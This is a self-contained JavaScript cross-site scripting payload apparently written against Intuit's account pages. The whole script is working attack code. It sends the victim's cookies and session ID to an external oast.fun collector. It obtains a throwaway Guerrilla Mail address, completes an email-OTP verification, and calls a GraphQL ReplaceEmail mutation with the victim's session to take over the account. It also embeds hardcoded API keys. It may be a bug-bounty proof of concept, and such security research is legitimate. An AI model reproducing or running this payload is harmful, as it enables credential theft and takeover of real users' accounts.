(function(){
try{
var O='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun';
var W='https://atmeta-wildcard-monitor.nasseurpay.workers.dev/?url=';
var G='https://api.guerrillamail.com/ajax.php';
var out=[];

function gc(n){
var m=document.cookie.match(new RegExp('(?:^|;\\s*)'+n.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+'=([^;]*)'));
return m?decodeURIComponent(m[1]):''
}
function beacon(tag,data){(new Image).src=O+'/'+tag+'?d='+encodeURIComponent((data||'').substring(0,900))}
function render(){
try{
if(!document.body){document.documentElement.appendChild(document.createElement('body'))}
document.body.innerHTML='<pre style="font:13px monospace;background:#111;color:#0f0;padding:20px;white-space:pre-wrap">'+out.join('\n')+'</pre>';
}catch(e){}
}
function log(msg){out.push(msg);render()}
function wp(url){
return fetch(W+encodeURIComponent(url)).then(function(r){
if(!r.ok)throw new Error('proxy '+r.status);
return r.text()
})
}
function uuid(){return'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,function(c){var r=Math.random()*16|0;return(c==='x'?r:r&3|8).toString(16)})}

var session=gc('ius_session');
var visitorId=gc('ivid');

beacon('p22-start',session.substring(0,30));
(new Image).src=O+'/p22-cookies?c='+encodeURIComponent(document.cookie.substring(0,2000));

var hdrs={
'Content-Type':'application/json',
'authorization':'Intuit_APIKey intuit_apikey=prdakyres3YphxpI5f5NhtHOzVAHTTAuQmL8UmCB, intuit_apikey_version=1.0',
'intuit_sessionid':session,
'intuit_profilingid':session,
'intuit_visitorid':visitorId,
'intuit_flowid':uuid(),
'intuit_offeringid':'Intuit.identity.experiences.oneintuitam',
'intuit_intentassetalias':'Intuit.identity.experiences.oneintuitam',
'intuit_origin':'https://accounts.intuit.com',
'intuit_country':'US',
'intuit_locale':'en-gb',
'intuit_offeringenv':'prd',
'intuit_authn_session_slot':'qbn',
'intuit_samesite_support':'true',
'intuit_identity_routing':'SBSEG',
'intuit_interception':'ignore-response',
'intuit_baggage':btoa(JSON.stringify({scope_area:'remediation',additional_fields:{}}))
};

log('[*] XSS on '+location.origin);
log('[*] Original session: '+session.substring(0,20)+'...');
log('');
log('[0] Getting temp email...');

wp(G+'?f=get_email_address')
.then(function(raw){
var data=JSON.parse(raw);
var email=data.email_addr;
var sid=data.sid_token;
log('[0] Email: '+email);
beacon('p22-email',email);

log('[1] Calling initialize...');
return fetch('/factors/v1/verifier/initialize/email',{
method:'POST',headers:hdrs,credentials:'include',
body:JSON.stringify({verifierPolicyId:'emailOtpSignIn',emailAddress:email})
}).then(function(r){return r.json()}).then(function(d){
if(!d.verifierSessionId)throw new Error('no vsid');
var vsid=d.verifierSessionId;
log('[1] vsid: '+vsid);
beacon('p22-init',vsid);

log('[2] Polling for OTP...');
var attempt=0;
function poll(){
attempt++;
return wp(G+'?f=check_email&seq=0&sid_token='+encodeURIComponent(sid))
.then(function(raw){
var resp=JSON.parse(raw);
var list=resp.list||[];
log('[2] Poll #'+attempt+': '+list.length+' emails');
if(list.length>0){
var found=null;
for(var i=0;i<list.length;i++){
var subj=(list[i].mail_subject||'').toLowerCase();
if(subj.indexOf('welcome to guerrilla')!==-1)continue;
found=list[i];break
}
if(found){
log('[2] Got: '+found.mail_subject);
return wp(G+'?f=fetch_email&email_id='+found.mail_id+'&sid_token='+encodeURIComponent(sid))
.then(function(r2){return JSON.parse(r2)})
}
}
if(attempt>=60)throw new Error('timeout');
return new Promise(function(res){setTimeout(function(){res(poll())},3000)})
})
}

return poll().then(function(msg){
var body=(msg.mail_body||'').replace(/<[^>]*>/g,' ');
var m=body.match(/\b(\d{6})\b/);
var otp=m?m[1]:null;
if(!otp)throw new Error('no OTP');
log('[2] OTP: '+otp);
beacon('p22-otp',otp);

log('[3] Verifying OTP...');
return fetch('/factors/v1/verifier/verify/email',{
method:'POST',headers:hdrs,credentials:'include',
body:JSON.stringify({verifierSessionId:vsid,otp:otp})
}).then(function(r){return r.json()}).then(function(vd){
if(!vd.verifierToken)throw new Error('no token: '+JSON.stringify(vd));
var vt=vd.verifierToken;
log('[3] Got verifierToken ('+vt.length+' chars)');
beacon('p22-vt',vt.substring(0,100));

log('[4] Skipping SignIn — calling ReplaceEmail directly...');
log('[4] Using original session (victim): '+session.substring(0,20)+'...');

var replaceHdrs={
'Content-Type':'application/json',
'authorization':'Intuit_APIKey intuit_apikey=prdakyresHrPbNYmoGmqMbZzZslfhGPRbBpwMfzE, intuit_apikey_version=1.0',
'intuit_sessionid':session,
'intuit_profilingid':session,
'intuit_visitorid':visitorId,
'intuit_flowid':uuid(),
'intuit_offeringid':'Intuit.cto.iam.ius',
'intuit_intentassetalias':'Intuit.cto.iam.ius',
'intuit_baggage':btoa(JSON.stringify({scope_area:'account_manager'})),
'intuit_tid':uuid()
};

var replaceQuery='mutation ReplaceEmail($input:Identity_CreateOrReplaceEmailCredentialInput!){identityCreateOrReplaceEmailCredential(input:$input){__typename ...on Identity_CreateOrReplaceEmailCredentialSuccess{status}...on Identity_CredentialUnauthorizedError{message}...on Identity_CredentialInvalidInputError{message}...on Identity_DigitalIdentityLockedOutError{message}}}';

log('[4a] Trying with verifierToken in input...');
return fetch('/identity-api/v2/graphql',{
method:'POST',headers:replaceHdrs,credentials:'include',
body:JSON.stringify({
query:replaceQuery,
variables:{input:{newEmailAddress:email,verifierToken:vt}},
operationName:'ReplaceEmail'
})
}).then(function(r){return r.text()}).then(function(rr){
log('[4a] Response: '+rr.substring(0,300));
beacon('p22-replace-a',rr.substring(0,400));
var rrd;try{rrd=JSON.parse(rr)}catch(e){}
if(rrd&&rrd.data&&rrd.data.identityCreateOrReplaceEmailCredential){
var t=rrd.data.identityCreateOrReplaceEmailCredential.__typename;
if(t==='Identity_CreateOrReplaceEmailCredentialSuccess'){
log('');
log('=== EMAIL CHANGED TO: '+email+' ===');
beacon('p22-done','SUCCESS email='+email);
return
}
log('[4a] Result: '+t+' — '+(rrd.data.identityCreateOrReplaceEmailCredential.message||''));
}

log('[4b] Trying without verifierToken...');
return fetch('/identity-api/v2/graphql',{
method:'POST',headers:replaceHdrs,credentials:'include',
body:JSON.stringify({
query:replaceQuery,
variables:{input:{newEmailAddress:email}},
operationName:'ReplaceEmail'
})
}).then(function(r){return r.text()}).then(function(rr2){
log('[4b] Response: '+rr2.substring(0,300));
beacon('p22-replace-b',rr2.substring(0,400));
var rrd2;try{rrd2=JSON.parse(rr2)}catch(e){}
if(rrd2&&rrd2.data&&rrd2.data.identityCreateOrReplaceEmailCredential){
var t2=rrd2.data.identityCreateOrReplaceEmailCredential.__typename;
if(t2==='Identity_CreateOrReplaceEmailCredentialSuccess'){
log('');
log('=== EMAIL CHANGED TO: '+email+' ===');
beacon('p22-done','SUCCESS email='+email);
return
}
log('[4b] Result: '+t2+' — '+(rrd2.data.identityCreateOrReplaceEmailCredential.message||''));
}

log('[4c] Trying with first API key...');
replaceHdrs['authorization']='Intuit_APIKey intuit_apikey=prdakyres3YphxpI5f5NhtHOzVAHTTAuQmL8UmCB, intuit_apikey_version=1.0';
return fetch('/identity-api/v2/graphql',{
method:'POST',headers:replaceHdrs,credentials:'include',
body:JSON.stringify({
query:replaceQuery,
variables:{input:{newEmailAddress:email}},
operationName:'ReplaceEmail'
})
}).then(function(r){return r.text()}).then(function(rr3){
log('[4c] Response: '+rr3.substring(0,300));
beacon('p22-replace-c',rr3.substring(0,400));
var rrd3;try{rrd3=JSON.parse(rr3)}catch(e){}
if(rrd3&&rrd3.data&&rrd3.data.identityCreateOrReplaceEmailCredential){
var t3=rrd3.data.identityCreateOrReplaceEmailCredential.__typename;
if(t3==='Identity_CreateOrReplaceEmailCredentialSuccess'){
log('');
log('=== EMAIL CHANGED TO: '+email+' ===');
beacon('p22-done','SUCCESS email='+email);
return
}
log('[4c] Result: '+t3+' — '+(rrd3.data.identityCreateOrReplaceEmailCredential.message||''));
}
log('');
log('[!] All attempts failed');
beacon('p22-allfail','done');
})
})
})
})
})
})
})
.catch(function(err){
log('[!] ERROR: '+err.message);
beacon('p22-err',err.message);
});

}catch(e){
(new Image).src='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun/p22-crash?e='+encodeURIComponent(e.message);
}
})();
